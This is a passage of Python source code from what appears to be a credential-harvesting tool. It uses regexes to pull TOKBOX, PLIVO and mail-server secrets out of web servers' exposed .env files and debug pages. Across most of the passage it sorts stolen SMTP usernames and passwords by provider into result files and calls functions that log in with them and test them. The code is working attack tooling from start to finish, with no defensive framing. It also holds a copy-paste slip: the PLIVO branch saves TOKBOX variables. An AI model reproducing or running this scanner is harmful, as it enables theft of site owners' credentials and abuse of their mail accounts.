						tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_OLD" in text:
				if "TOKBOX_KEY_OLD=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_OLD</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "PLIVO_AUTH_ID" in text:
				if "PLIVO_AUTH_ID=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PLIVO_AUTH_ID</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(tokbox_key)+'\nPLIVO_AUTH_TOKEN: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open(o_plivo, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_smtp(self, text, url):
		oke = 0
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					satu = cleanit(mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass)
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/SMTP(AWS).txt', 'a')
						save2.write(remover+'\n')
						save2.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					elif 'sendgrid' in mailhost:
						build = str(mailuser)+':'+str(mailpass)
						remover = str(build).replace('\r', '')
						print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ SENDGRID [{mailpass}]"))
						save = open('Results/SMTP(SENDGRID).txt', 'a')
						save.write(remover+'\n')
						save.close()
						ceker_sendgrid(url, mailpass)
						build_forchecker = str(mailhost)+":"+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover2 = str(build_forchecker).replace('\r', '')
						save3 = open('Results/forchecker/sendgrid.txt','a')
						save3.write(remover2+'\n')
						save3.close()
						ceker_sendgrid(url, mailpass)
					elif 'office365' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OFFICE365).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(1AND1).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zoho' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZOHO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MANDRILL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mailgun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILGUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ITALY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'emailsrvr' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RACKSPACE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hostinger' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOSTINGER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.yandex' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YANDEX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.OVH' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OVH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.ionos' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(IONOS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zimbra' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZIMBRA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'kasserver.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(KASSASERVER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'smtp-relay.gmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'sparkpostmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SPARKPOST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.jp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(JAPAN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmoserver' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1

					elif 'mailjet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILJET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'googlemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GOOGLEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'aruba.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ARUBA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hetzner' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HETZNER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '163' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(163).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '263' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(263).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'Aliyun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ALIYUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'att.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ATTNET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'chinaemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(CHINAEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'comcast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COMCAST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'cox.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'earthlink' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(EARTH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'global-mail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GLOBAL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmx' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'godaddy' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GODADDY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hinet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HINET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hotmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mail.ru' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILRU).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mimecast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mweb' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MWEB).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'netease' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETEASE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'NetworkSolutions' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETWORK).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'outlook' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'qq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(QQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'sina-email' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SINA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'strato' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(STRATO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'synaq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SYNAQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'yihigher' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YIGHER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'rise-tokyo' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RISE-TOKIO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'tatsumi-b' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(TATSUMI).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1

					elif 'sendinblue' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SENDINBLUE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					else:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
